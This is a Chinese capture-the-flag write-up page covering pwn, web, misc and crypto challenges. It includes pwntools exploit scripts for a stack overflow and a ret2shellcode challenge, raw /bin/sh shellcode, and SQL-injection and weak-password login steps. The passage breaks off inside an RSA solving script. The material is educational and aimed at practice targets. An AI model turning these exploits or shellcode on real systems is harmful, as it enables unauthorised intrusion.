+<p>先看show函数</p>
+<p>
+    <img src="../imgs/image-20251001172642938.png" alt="image-20251001172642938"  loading="lazy" /></p>
+<p>发现有提示，告诉我们ret2text，接下来看try函数</p>
+<p>
+    <img src="../imgs/image-20251001172758494.png" alt="image-20251001172758494"  loading="lazy" /></p>
+<p>发现存在栈溢出，gets是一个危险函数，对读入的数据没有大小限制，接下来我们来找一下后门函数</p>
+<p>
+    <img src="../imgs/image-20251001172909096.png" alt="image-20251001172909096"  loading="lazy" /></p>
+<p>gdb调试确定偏移</p>
+<p>
+    <img src="../imgs/image-20251001173601559.png" alt="image-20251001173601559"  loading="lazy" /></p>
+<p>接下来，可以写exp，一边写一边调试</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./overflow&#34;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./overflow&#34;</span>)
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">264</span>
+</span></span><span style="display:flex;"><span>backdoor_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;backd00r&#39;</span>]
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> offset <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">+</span> p64(backdoor_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter your input:&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>这里打本地时发现直接用backdoor的地址会报错，这里往下找一条，原因是调试64位程序时，ubuntu18以上系统调用system函数时是需要栈对齐的。再具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐。</p>
+<p>
+    <img src="../imgs/image-20251001174813525.png" alt="image-20251001174813525"  loading="lazy" /></p>
+<p>接下来打远程拿flag</p>
+<p>
+    <img src="../imgs/image-20251001174952500.png" alt="image-20251001174952500"  loading="lazy" /></p>
+<p>flag{e6437c28-4be9-424e-aebb-47000f703a03}</p>
+<h3>input_function<span class="hx:absolute hx:-mt-20" id="input_function"></span>
+    <a href="#input_function" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>pwn的常规流程，先看看保护</p>
+<p>
+    <img src="../imgs/image-20251001175719393.png" alt="image-20251001175719393"  loading="lazy" /></p>
+<p>分析代码，可以看见read是溢出点，mmap使得这段内存可读可写可执行，能分析出考察ret2shellcode</p>
+<p>
+    <img src="../imgs/image-20251001175354965.png" alt="image-20251001175354965"  loading="lazy" /></p>
+<p>gdb调试vmmap找有rwx权限的地址</p>
+<p>
+    <img src="../imgs/image-20251001175959122.png" alt="image-20251001175959122"  loading="lazy" /></p>
+<p>直接写脚本，打本地</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./input_function&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x500</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20251001181920224.png" alt="image-20251001181920224"  loading="lazy" /></p>
+<p>接下来打远程</p>
+<p>
+    <img src="../imgs/image-20251001182135815.png" alt="image-20251001182135815"  loading="lazy" /></p>
+<p>flag{c7ecd813-fb82-431c-8266-2c8ae2d08609}</p>
+<h2>Web<span class="hx:absolute hx:-mt-20" id="web"></span>
+    <a href="#web" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>multi-headach3<span class="hx:absolute hx:-mt-20" id="multi-headach3"></span>
+    <a href="#multi-headach3" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>根据题目提示，猜测爬虫协议</p>
+<p>
+    <img src="../imgs/image-20250930144854550.png" alt="image-20250930144854550"  loading="lazy" /></p>
+<p>有一个hidden.php 不允许访问，那不让看我偏看</p>
+<p>
+    <img src="../imgs/image-20250930144920056.png" alt="image-20250930144920056"  loading="lazy" /></p>
+<p>访问后，看网络请求，发现页面被重定向，flag写在响应头</p>
+<p>
+    <img src="../imgs/image-20250930145030371.png" alt="image-20250930145030371"  loading="lazy" /></p>
+<h3>strange_login<span class="hx:absolute hx:-mt-20" id="strange_login"></span>
+    <a href="#strange_login" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>打开页面看见登录框，结合提示：我当然知道1=1了！</p>
+<p>
+    <img src="../imgs/image-20250930145159525.png" alt="image-20250930145159525"  loading="lazy" /></p>
+<p>合理怀疑是SQL注入，直接万能密码</p>
+<p>
+    <img src="../imgs/image-20250930145336769.png" alt="image-20250930145336769"  loading="lazy" /></p>
+<p>登录进去，获得flag</p>
+<p>
+    <img src="../imgs/image-20250930145410178.png" alt="image-20250930145410178"  loading="lazy" /></p>
+<h3>黑客小W的故事（1）<span class="hx:absolute hx:-mt-20" id="黑客小w的故事1"></span>
+    <a href="#%e9%bb%91%e5%ae%a2%e5%b0%8fw%e7%9a%84%e6%95%85%e4%ba%8b1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>抓包修改count ,得到下一关的路由
+    <img src="../imgs/image-20250929144924789.png" alt="image-20250929144924789"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20250929145029287.png" alt="image-20250929145029287"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20250929145050971.png" alt="image-20250929145050971"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20250929145116825.png" alt="image-20250929145116825"  loading="lazy" /></p>
+<p>根据提示</p>
+<p>
+    <img src="../imgs/image-20250929145212777.png" alt="image-20250929145212777"  loading="lazy" /></p>
+<p>抓包改包</p>
+<p>
+    <img src="../imgs/image-20250929211047391.png" alt="image-20250929211047391"  loading="lazy" /></p>
+<p>改成delete方法</p>
+<p>
+    <img src="../imgs/image-20250929210942877.png" alt="image-20250929210942877"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20250929211243252.png" alt="image-20250929211243252"  loading="lazy" /></p>
+<p>继续</p>
+<p>
+    <img src="../imgs/image-20250929211417301.png" alt="image-20250929211417301"  loading="lazy" /></p>
+<p>改UA头再发包</p>
+<p>
+    <img src="../imgs/image-20250930104437590.png" alt="image-20250930104437590"  loading="lazy" /></p>
+<p>试试将正常的ua头部分替换</p>
+<p>CycloneSlash/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) DashSlash/140.0.0.0 Safari/537.36</p>
+<p>
+    <img src="../imgs/image-20250930110659491.png" alt="image-20250930110659491"  loading="lazy" /></p>
+<p>拿到flag</p>
+<p>
+    <img src="../imgs/image-20250930110724906.png" alt="image-20250930110724906"  loading="lazy" /></p>
+<p>flag{d9689014-bc9e-4712-9779-89adccbd79fc}</p>
+<h3>宇宙的中心是php<span class="hx:absolute hx:-mt-20" id="宇宙的中心是php"></span>
+    <a href="#%e5%ae%87%e5%ae%99%e7%9a%84%e4%b8%ad%e5%bf%83%e6%98%afphp" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>打开页面后发现没有办法使用快捷键看源码，使用view-source:协议</p>
+<p>
+    <img src="../imgs/image-20250930145711013.png" alt="image-20250930145711013"  loading="lazy" /></p>
+<p>访问s3kret.php，十六进制绕过得到flag</p>
+<p>
+    <img src="../imgs/image-20250930145919566.png" alt="image-20250930145919566"  loading="lazy" /></p>
+<h3>我真得控制你了<span class="hx:absolute hx:-mt-20" id="我真得控制你了"></span>
+    <a href="#%e6%88%91%e7%9c%9f%e5%be%97%e6%8e%a7%e5%88%b6%e4%bd%a0%e4%ba%86" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>打开题目，用view-source看源码，然后f12打开开发者工具</p>
+<p>
+    <img src="../imgs/image-20250930153340763.png" alt="image-20250930153340763"  loading="lazy" /></p>
+<p>删除后，按住esc，点击启动</p>
+<p>
+    <img src="../imgs/image-20250930153718919.png" alt="image-20250930153718919"  loading="lazy" /></p>
+<p>来到这个页面</p>
+<p>
+    <img src="../imgs/image-20250930153806434.png" alt="image-20250930153806434"  loading="lazy" /></p>
+<p>提示弱口令，猜一猜就出来了，或者爆破也可以 用户名是admin密码是111111</p>
+<p>
+    <img src="../imgs/image-20250930153921139.png" alt="image-20250930153921139"  loading="lazy" /></p>
+<p>分析代码，逻辑为需要输入一个表达式最后表达式的值为2025，传~(~2025)，绕过限制拿到flag</p>
+<p>
+    <img src="../imgs/image-20250930154041181.png" alt="image-20250930154041181"  loading="lazy" /></p>
+<h3>别笑，你也过不了第二关<span class="hx:absolute hx:-mt-20" id="别笑你也过不了第二关"></span>
+    <a href="#%e5%88%ab%e7%ac%91%e4%bd%a0%e4%b9%9f%e8%bf%87%e4%b8%8d%e4%ba%86%e7%ac%ac%e4%ba%8c%e5%85%b3" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>发现是小游戏，ctrl+u 查看源码</p>
+<p>
+    <img src="../imgs/image-20250930154520618.png" alt="image-20250930154520618"  loading="lazy" /></p>
+<p>发现关键代码</p>
+<p>
+    <img src="../imgs/image-20250930154918445.png" alt="image-20250930154918445"  loading="lazy" /></p>
+<p>手动访问
+    <img src="../imgs/image-20250930155010048.png" alt="image-20250930155010048"  loading="lazy" /></p>
+<p>根据关键性代码抓包改包，得到flag</p>
+<p>
+    <img src="../imgs/image-20250930155113924.png" alt="image-20250930155113924"  loading="lazy" /></p>
+<h2>Misc<span class="hx:absolute hx:-mt-20" id="misc"></span>
+    <a href="#misc" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>Sign in<span class="hx:absolute hx:-mt-20" id="sign-in"></span>
+    <a href="#sign-in" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>签到题，没什么好说的</p>
+<p>
+    <img src="../imgs/image-20250929141357718.png" alt="image-20250929141357718"  loading="lazy" /></p>
+<h3>MISC城邦-压缩术<span class="hx:absolute hx:-mt-20" id="misc城邦-压缩术"></span>
+    <a href="#misc%e5%9f%8e%e9%82%a6-%e5%8e%8b%e7%bc%a9%e6%9c%af" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>拿到附件解压，发现需要密码，读题发现提示：欢迎挑战者们来到压缩术的考验关卡，本关考察压缩术的综合使用，请挑战者们通过6位密码门开始挑战吧！(要想使用压缩术，请先念咒语&quot;abcd&hellip;xyz0123&hellip;789&quot;)，猜测压缩包<strong>密码可能是6位密码，小写字母数字组合</strong></p>
+<p>使用工具爆破密码，规则小写字母+数字+长度6</p>
+<p>
+    <img src="../imgs/image-20250929141649962.png" alt="image-20250929141649962"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20250929141831832.png" alt="image-20250929141831832"  loading="lazy" /></p>
+<p>爆破出密码ns2025解压后得到</p>
+<p>
+    <img src="../imgs/image-20250929141917568.png" alt="image-20250929141917568"  loading="lazy" /></p>
+<p>看提示文件</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>恭喜你，通过了第一道考验，请用其他压缩魔法打开下一扇门吧！（下一扇门明明没有密码，为什么还是要输入密码呢？）</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>可能压缩包是伪加密，修复后解压得到</p>
+<p>
+    <img src="../imgs/image-20250929142050278.png" alt="image-20250929142050278"  loading="lazy" /></p>
+<p>发现flag.zip里也有key.txt，而且和外面得到key.txt大小一致，怀疑key.txt就是这个压缩里的文件，将key.txt用和flag.zip同样的压缩软件压缩后，使用明文攻击，这里猜测使用winrar压缩</p>
+<p>
+    <img src="../imgs/image-20250929142515725.png" alt="image-20250929142515725"  loading="lazy" /></p>
+<p>拿到密码解压后拿到flag</p>
+<p>
+    <img src="../imgs/image-20250929142600939.png" alt="image-20250929142600939"  loading="lazy" /></p>
+<h3>EZ_fence<span class="hx:absolute hx:-mt-20" id="ez_fence"></span>
+    <a href="#ez_fence" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>拿到一张图片，图片有一些奇怪的字符，像base64但是base64的等于在末尾，再根据题目名称fence 是栅栏的意思，猜测需要先解栅栏把等于号移动到最后再base64。先jpg图片binwalk分离压缩包</p>
+<p>
+    <img src="../imgs/image-20250930023213242.png" alt="image-20250930023213242"  loading="lazy" /></p>
+<p>拿到一个压缩包，里面应该就是flag，但需要密码，不知道密码先放一边</p>
+<p>jpg图片修复高度后得到</p>
+<p>
+    <img src="../imgs/image-20250930020303570.png" alt="image-20250930020303570"  loading="lazy" /></p>
+<p>发现下面字符刚好64个可能是换表base64，可以试试上面的栏栅后解base64</p>
+<p>base64表</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>8426513709qazwsxedcrfvtgbyhnujmikoplQWSAERFDTYHGUIKJOPLMNBVCXZ-_</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>将 rdh9zfwzSgoVA7GWtLPQJK=vwuZvjhvPyyvjnMWoSotB</p>
+<p>解栏栅密码W型栏栅分4栏得rSvMwgdouWZVhAvoj79GhSvWztPoyLfPytvQwJjBnKz=</p>
+<p>
+    <img src="../imgs/image-20250930023021199.png" alt="image-20250930023021199"  loading="lazy" /></p>
+<p>再换表base64解码得到 New5tar_zjuatrojee1mage5eed77yo#</p>
+<p>
+    <img src="../imgs/image-20250930022626293.png" alt="image-20250930022626293"  loading="lazy" /></p>
+<p>应该是图片分离出来的压缩包的密码，解压看见flag.doc文件内容就是flag</p>
+<p>flag{y0u_kn0w_ez_fence_tuzh0ng}</p>
+<h3>OSINT-天空belong<span class="hx:absolute hx:-mt-20" id="osint-天空belong"></span>
+    <a href="#osint-%e5%a4%a9%e7%a9%babelong" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>先读题</p>
+<p>flag格式：flag{航班号_当前已经经过的省会城市名称(**市)_所拍摄设备制造商}</p>
+<p>
+    <img src="../imgs/image-20250929160659700.png" alt="image-20250929160659700"  loading="lazy" /></p>
+<p>发现一些关键信息，拍摄日期是2025/8/17 15:03，设备制造商是Xiaomi，看图可以发现飞机注册号为B-7198</p>
+<p>经查询B-7198 是一架属于乌鲁木齐航空（Urumqi Air）的波音 737-800 飞机</p>
+<p>它经常执飞的航线包括乌鲁木齐地窝堡国际机场往返新加坡樟宜机场（经停武汉天河国际机场）的 UQ2661 和 UQ2662 航班，以及乌鲁木齐地窝堡国际机场往返合肥新桥国际机场、兰州中川国际机场的 UQ2521 和 UQ2522 航班，接下来去查那个时间段的航班信息</p>
+<p>
+    <img src="../imgs/image-20250929161709210.png" alt="image-20250929161709210"  loading="lazy" /></p>
+<p>符合拍摄时间的应该就只有这一航班</p>
+<p>
+    <img src="../imgs/image-20250929163208749.png" alt="image-20250929163208749"  loading="lazy" /></p>
+<p>flag{UQ3574_武汉_Xiaomi}</p>
+<h3>我不要革命失败<span class="hx:absolute hx:-mt-20" id="我不要革命失败"></span>
+    <a href="#%e6%88%91%e4%b8%8d%e8%a6%81%e9%9d%a9%e5%91%bd%e5%a4%b1%e8%b4%a5" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>下载附件后拿到一个txt和dmp文件，txt内容flag{崩溃类型(即蓝屏显示的终止代码)_故障进程}</p>
+<p>使用windbg打开</p>
+<p>
+    <img src="../imgs/image-20250929224307859.png" alt="image-20250929224307859"  loading="lazy" /></p>
+<p>!process ffffd18e9cfbc140 0来获取具体的进程名称
+    <img src="../imgs/image-20250929224236076.png" alt="image-20250929224236076"  loading="lazy" /></p>
+<p>flag{CRITICAL_PROCESS_DIED_svchost.exe}</p>
+<h3>前有文字，所以搜索很有用<span class="hx:absolute hx:-mt-20" id="前有文字所以搜索很有用"></span>
+    <a href="#%e5%89%8d%e6%9c%89%e6%96%87%e5%ad%97%e6%89%80%e4%bb%a5%e6%90%9c%e7%b4%a2%e5%be%88%e6%9c%89%e7%94%a8" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>拿到题目，解压发现有三个文件夹分别看看</p>
+<p>
+    <img src="../imgs/image-20250929230742555.png" alt="image-20250929230742555"  loading="lazy" /></p>
+<p>看track1，根据文件名称提示猜测零宽字符隐写</p>
+<p>
+    <img src="../imgs/image-20250929231353165.png" alt="image-20250929231353165"  loading="lazy" /></p>
+<p>把隐藏的内容解base64</p>
+<p>
+    <img src="../imgs/image-20250929231316752.png" alt="image-20250929231316752"  loading="lazy" /></p>
+<p>拿到flag的第一部分flag{you_</p>
+<p>track2先看txt文件，很明显的brainfuck特征</p>
+<p>
+    <img src="../imgs/image-20250929231621404.png" alt="image-20250929231621404"  loading="lazy" /></p>
+<p>解密得到brainfuckisgooooood，接下来看咏雪.docx，将所有内容复制到记事本</p>
+<p>
+    <img src="../imgs/image-20250930013211900.png" alt="image-20250930013211900"  loading="lazy" /></p>
+<p>猜测可能为snow隐写，用工具解</p>
+<p>
+    <img src="../imgs/image-20250930013230197.png" alt="image-20250930013230197"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20250930013057705.png" alt="image-20250930013057705"  loading="lazy" /></p>
+<p>解莫斯密码得到 flag的中间部分0V3RC4ME_</p>
+<p>track3里有个txt，名称是谁多谁少，一算便知.txt，打开后发现很多奇怪的字符，根据文件名猜测是字频统计</p>
+<p>
+    <img src="../imgs/image-20250929230950738.png" alt="image-20250929230950738"  loading="lazy" /></p>
+<p>这里很像flag的最后一段，记录下来cH@1LenG3s}</p>
+<p>最后得到flag{you_0V3RC4ME_cH@1LenG3s}</p>
+<h2>Crypto<span class="hx:absolute hx:-mt-20" id="crypto"></span>
+    <a href="#crypto" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>Sagemath使用指哪？<span class="hx:absolute hx:-mt-20" id="sagemath使用指哪"></span>
+    <a href="#sagemath%e4%bd%bf%e7%94%a8%e6%8c%87%e5%93%aa" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>
+    <img src="../imgs/image-20250929165127613.png" alt="image-20250929165127613"  loading="lazy" /></p>
+<p>执行脚本获得flag</p>
+<h3>初识RSA<span class="hx:absolute hx:-mt-20" id="初识rsa"></span>
+    <a href="#%e5%88%9d%e8%af%86rsa" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>读题，需要解key值5ae9b7f211e23aac3df5f2b8f3b8eada</p>
+<p>直接somd5网站在线解密https://www.somd5.com/</p>
+<p>
+    <img src="../imgs/image-20250929171150323.png" alt="image-20250929171150323"  loading="lazy" /></p>
+<p>写解密脚本</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> math
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 已知数据</span>
+</span></span><span style="display:flex;"><span>P_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">8950704257708450266553505566662195919814660677796969745141332884563215887576312397012443714881729945084204600427983533462340628158820681332200645787691506</span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">44446616188218819786207128669544260200786245231084315865332960254466674511396013452706960167237712984131574242297631824608996400521594802041774252109118569706894250996931000927100268277762882754652796291883967540656284636140320080424646971672065901724016868601110447608443973020392152580956168514740954659431174557221037876268055284535861917524270777789465109449562493757855709667594266126482042307573551713967456278514060120085808631486752297737122542989222157016105822237703651230721732928806660755347805734140734412060262304703945060273095463889784812104712104670060859740991896998661852639384506489736605859678660859641869193937584995837021541846286340552602342167842171089327681673432201518271389316638905030292484631032669474635442148203414558029464840768382970333</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">42481263623445394280231262620086584153533063717448365833463226221868120488285951050193025217363839722803025158955005926008972866584222969940058732766011030882489151801438753030989861560817833544742490630377584951708209970467576914455924941590147893518967800282895563353672016111485919944929116082425633214088603366618022110688943219824625736102047862782981661923567377952054731667935736545461204871636455479900964960932386422126739648242748169170002728992333044486415920542098358305720024908051943748019208098026882781236570466259348897847759538822450491169806820787193008018522291685488876743242619977085369161240842263956004215038707275256809199564441801377497312252051117441861760886176100719291068180295195677144938101948329274751595514805340601788344134469750781845</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 已知 key</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;crypto&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 验证 MD5</span>
+</span></span><span style="display:flex;"><span>KEY <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(key)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;KEY = </span><span style="color:#e6db74">{</span>KEY<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> KEY <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5ae9b7f211e23aac3df5f2b8f3b8eada&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 恢复 p</span>
+</span></span><span style="display:flex;"><span>key_long <span style="color:#f92672">=</span> bytes_to_long(key)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> P_ <span style="color:#f92672">^</span> key_long
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;p = </span><span style="color:#e6db74">{</span>p<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 验证 p 是素数且满足 n = p^3 * q^2</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;p is prime: </span><span style="color:#e6db74">{</span>isPrime(p)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;n % p^3 == 0: </span><span style="color:#e6db74">{</span>n <span style="color:#f92672">%</span> (p<span style="color:#f92672">**</span><span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 计算 q</span>
+</span></span><span style="display:flex;"><span>q2 <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> (p<span style="color:#f92672">**</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> math<span style="color:#f92672">.</span>isqrt(q2)  <span style="color:#75715e"># 使用 math.isqrt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> q <span style="color:#f92672">*</span> q <span style="color:#f92672">==</span> q2 <span style="color:#f92672">and</span> isPrime(q):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;q = </span><span style="color:#e6db74">{</span>q<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 尝试附近值</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> q_candidate <span style="color:#f92672">in</span> range(q<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>, q<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>):
